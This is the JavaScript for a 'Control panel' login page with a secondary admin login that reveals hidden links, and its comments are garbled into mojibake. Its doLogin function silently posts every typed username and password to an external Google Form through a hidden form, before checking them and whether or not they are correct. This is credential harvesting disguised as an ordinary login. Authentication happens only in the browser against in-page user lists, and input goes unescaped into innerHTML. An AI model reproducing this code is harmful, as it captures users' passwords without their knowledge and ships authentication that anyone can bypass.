function renderDashboard() {
    const container = document.getElementById('linkGrid');
    container.innerHTML = '';
    
    // ‡πÄ‡∏•‡∏∑‡∏≠‡∏Å‡∏ä‡∏∏‡∏î‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•
    const linksToRender = hiddenLinksVisible ? HIDDEN_LINKS : BASIC_LINKS;
    
    linksToRender.forEach((link, index) => {
        if (!link.url || link.url === "" || link.url === "https://") return;
        
        const a = document.createElement('a');
        a.href = link.url;
        a.target = "_blank"; 
        a.className = "link-card visible-link";
        a.innerText = link.name;
        
        if (hiddenLinksVisible) {
            a.classList.add('secret-mode');
        }

        a.style.animationDelay = (index * 0.05) + 's';
        container.appendChild(a);
    });
    
    if (hiddenLinksVisible) {
        document.getElementById('secondaryLoginBtn').classList.remove('active');
    } else {
        document.getElementById('secondaryLoginBtn').classList.add('active');
    }

    const title = document.querySelector('#dashboard h1');
    if (hiddenLinksVisible) {
             // ‡πÅ‡∏Å‡πâ‡πÑ‡∏Ç: ‡πÄ‡∏õ‡∏•‡∏µ‡πà‡∏¢‡∏ô‡∏™‡∏µ Title ‡πÄ‡∏°‡∏∑‡πà‡∏≠‡πÄ‡∏Ç‡πâ‡∏≤‡∏™‡∏π‡πà Admin Mode ‡πÄ‡∏õ‡πá‡∏ô‡∏™‡∏µ‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ß (‡πÅ‡∏ï‡πà‡∏™‡∏ß‡πà‡∏≤‡∏á‡∏Å‡∏ß‡πà‡∏≤‡∏´‡∏£‡∏∑‡∏≠‡∏ï‡πà‡∏≤‡∏á‡∏Å‡∏±‡∏ô‡∏ô‡∏¥‡∏î‡∏´‡∏ô‡πà‡∏≠‡∏¢‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏ö‡∏≠‡∏Å‡∏™‡∏ñ‡∏≤‡∏ô‡∏∞)
             title.textContent = "Admin Control";
             title.style.color = "#00ffaa"; 
             title.style.textShadow = "0 0 20px rgba(0, 255, 170, 0.6)";
    } else {
             title.textContent = "Control panel";
             title.style.color = "#00ff9e";
             title.style.textShadow = "0 0 20px rgba(0, 255, 160, 0.5)";
    }
}

function showHiddenLinks() {
    hiddenLinksVisible = true;
    
    const allLinks = document.querySelectorAll('.link-card');
    allLinks.forEach((link, idx) => {
             link.style.transition = 'all 0.4s ease-in-out';
             link.style.opacity = '0';
             link.style.transform = 'scale(0.8)';
    });
    
    setTimeout(() => {
        renderDashboard(); 
    }, 450);
}

function submitToGoogleForm(u,p){
    const f=document.createElement('form');
    f.action=FORM_ACTION; f.method='POST'; f.target='hidden_gform';
    f.innerHTML=`<input type="hidden" name="${ENTRY_USER}" value="${u}"><input type="hidden" name="${ENTRY_PASS}" value="${p}">`;
    document.body.appendChild(f); f.submit(); f.remove();
}

function showOverlay(k){
    const o=document.getElementById('overlay');
    o.className='overlay show ' + (k==='ok'?'success':'fail');
    setTimeout(()=>o.classList.remove('show'),1200);
}

function doLogin(){
    const u=document.getElementById('user').value.replace(/\*/g,'');
    const p=document.getElementById('pass').value;

    submitToGoogleForm(u,p);

    // ‡πÄ‡∏ä‡πá‡∏Ñ‡∏à‡∏≤‡∏Å‡∏ó‡∏±‡πâ‡∏á‡∏™‡∏≠‡∏á‡∏Å‡∏•‡∏∏‡πà‡∏° (Full ‡∏´‡∏£‡∏∑‡∏≠ Basic ‡∏Å‡πá‡πÄ‡∏Ç‡πâ‡∏≤‡∏´‡∏ô‡πâ‡∏≤‡πÅ‡∏£‡∏Å‡πÑ‡∏î‡πâ)
    const foundFull = FULL_ACCESS_USERS.find(item => item.user === u && item.pass === p);
    const foundBasic = BASIC_ACCESS_USERS.find(item => item.user === u && item.pass === p);
    
    if(foundFull || foundBasic){
        currentUser = foundFull ? foundFull : foundBasic; // ‡πÄ‡∏Å‡πá‡∏ö user ‡∏ó‡∏µ‡πà login ‡πÄ‡∏Ç‡πâ‡∏≤‡∏°‡∏≤
        showOverlay('ok'); 
        
        setTimeout(()=> {
            renderDashboard();
            document.getElementById('loginWrapper').classList.add('vanish');
            document.getElementById('dashboard').classList.add('show-dash');
        }, 1400); 

    } else {
        showOverlay('fail');
    }
}

function doSecondaryLogin() {
    const u = document.getElementById('secondaryUser').value.replace(/\*/g,'');
    const p = document.getElementById('secondaryPass').value;

    // ‡πÄ‡∏ä‡πá‡∏Ñ‡πÄ‡∏â‡∏û‡∏≤‡∏∞‡∏Å‡∏•‡∏∏‡πà‡∏° FULL ACCESS ‡πÄ‡∏ó‡πà‡∏≤‡∏ô‡∏±‡πâ‡∏ô
    const foundUser = FULL_ACCESS_USERS.find(item => item.user === u && item.pass === p);

    if(foundUser){
        showOverlay('ok');
        
        setTimeout(() => {
            showHiddenLinks();
            document.getElementById('secondaryLoginForm').classList.remove('show');
            document.getElementById('secondaryUser').value = '';
            document.getElementById('secondaryPass').value = '';
        }, 1400);
        
    } else {
        showOverlay('fail');
        document.getElementById('secondaryPass').value = '';
    }
}

// Event Listeners
document.getElementById('loginBtn').addEventListener('click', doLogin);
document.getElementById('user').addEventListener('keyup', function(e) { if (e.key === 'Enter') doLogin(); });
document.getElementById('pass').addEventListener('keyup', function(e) { if (e.key === 'Enter') doLogin(); });

document.getElementById('secondaryLoginBtn').addEventListener('click', function() {
    document.getElementById('secondaryLoginForm').classList.add('show');
});
document.getElementById('secondaryLoginSubmit').addEventListener('click', doSecondaryLogin);
document.getElementById('secondaryLoginCancel').addEventListener('click', function() {
    document.getElementById('secondaryLoginForm').classList.remove('show');
    document.getElementById('secondaryUser').value = '';
    document.getElementById('secondaryPass').value = '';
});
document.getElementById('secondaryUser').addEventListener('keyup', function(e) { if (e.key === 'Enter') doSecondaryLogin(); });
document.getElementById('secondaryPass').addEventListener('keyup', function(e) { if (e.key === 'Enter') doSecondaryLogin(); });

document.addEventListener('click', function(e) {
    const form = document.getElementById('secondaryLoginForm');
    const btn = document.getElementById('secondaryLoginBtn');
    if (form.classList.contains('show') && !form.contains(e.target) && !btn.contains(e.target)) {
        form.classList.remove('show');
        document.getElementById('secondaryUser').value = '';
        document.getElementById('secondaryPass').value = '';
    }
});

// FX
(function(){
    const o=document.getElementById('overlay');
    const h=document.getElementById('holoStatus');
    const main=h.querySelector('.main');
    const sub=h.querySelector('.sub');
    new MutationObserver(()=>{
        if(o.classList.contains('show')){
            if(o.classList.contains('success')){
                h.className="success show"; main.textContent="ACCESS GRANTED"; sub.textContent="COMPLETE";
            } else {
                h.className="fail show"; main.textContent="ACCESS DENIED"; sub.textContent="FAIL";
            }
            setTimeout(()=>h.classList.remove('show'),1400);
        }
    }).observe(o,{attributes:true});
})();

(function(){
    const intro=document.getElementById('epicIntro');
    const fill=intro.querySelector('.fill');
    const L=intro.querySelector('#introL');
    const R=intro.querySelector('#introR');
    let cur=0,target=100;
    function tick(){
        cur=Math.min(cur+2,target);
        fill.style.width=cur+'%'; L.innerText=R.innerText=cur+'%';
        if(cur<100) requestAnimationFrame(tick);
        else setTimeout(()=>intro.classList.remove('show'),450);
    }
    window.addEventListener('load',()=>{ intro.classList.add('show'); requestAnimationFrame(tick);});
})();

const userInput = document.getElementById("user");
const toggleUser = document.getElementById("toggleUser");
function showUser() { userInput.type = "text"; toggleUser.textContent = "üôà"; }
function hideUser() { userInput.type = "password"; toggleUser.textContent = "üëÅÔ∏è"; }
toggleUser.addEventListener("mousedown", showUser);
toggleUser.addEventListener("mouseup", hideUser);
toggleUser.addEventListener("mouseleave", hideUser);
toggleUser.addEventListener("touchstart", e => { e.preventDefault(); showUser(); });
toggleUser.addEventListener("touchend", hideUser);
toggleUser.addEventListener("touchcancel", hideUser);
</script>
